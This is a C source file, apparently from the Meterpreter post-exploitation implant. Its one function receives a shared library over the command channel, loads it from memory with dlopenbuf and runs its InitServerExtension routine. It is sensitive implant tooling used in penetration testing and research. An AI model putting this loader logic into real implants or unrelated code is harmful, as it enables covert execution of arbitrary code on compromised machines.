#include <dlfcn.h>
#include "metsrv.h"


DWORD
request_core_loadlib(Remote *remote, Packet *packet)
{
	Packet *response = packet_create_response(packet);
	DWORD res = ERROR_SUCCESS;
	HMODULE library;
	PCHAR libraryPath;
	DWORD flags = 0;
	PCHAR targetPath;
	int local_error = 0;
	
	do
	{
		Tlv dataTlv;

		libraryPath = packet_get_tlv_value_string(packet, 
				TLV_TYPE_LIBRARY_PATH);
		flags       = packet_get_tlv_value_uint(packet, 
				TLV_TYPE_FLAGS);

		// Invalid library path?
		if (!libraryPath) {
			res = ERROR_INVALID_PARAMETER;
			break;
		}

		if(flags & LOAD_LIBRARY_FLAG_LOCAL) {
			// i'd be surprised if we could load 
			// libraries off the remote system without breaking severely.
			res = ERROR_NOT_SUPPORTED;
			break;
		}

		// Get the library's file contents
		if ((packet_get_tlv(packet, TLV_TYPE_DATA,
				&dataTlv) != ERROR_SUCCESS) ||
		    (!(targetPath = packet_get_tlv_value_string(packet,
				TLV_TYPE_TARGET_PATH)))) {
			res = ERROR_INVALID_PARAMETER;
			break;
		}

		dprintf("[%s] targetPath: %s", __FUNCTION__, targetPath);

		library = dlopenbuf(targetPath, dataTlv.buffer, dataTlv.header.length );
		dprintf("[%s] dlopenbuf(%s): %08x / %s", __FUNCTION__, targetPath, library, dlerror());
		if(! library) {
			res = ERROR_NOT_FOUND;
			break;
		}

		// If this library is supposed to be an extension library, try to
		// call its Init routine
		if (flags & LOAD_LIBRARY_FLAG_EXTENSION) {
			DWORD (*init)(Remote *remote);

			init = dlsym(library, "InitServerExtension" );
			// Call the init routine in the library
			if( init ) {
				dprintf("[%s] calling InitServerExtension", __FUNCTION__);
				res = init(remote);
			}
		}
		
	} while (0);
	
	if (response) {
		packet_add_tlv_uint(response, TLV_TYPE_RESULT, res);
		packet_transmit(remote, response, NULL);
	}

	return (res);
}
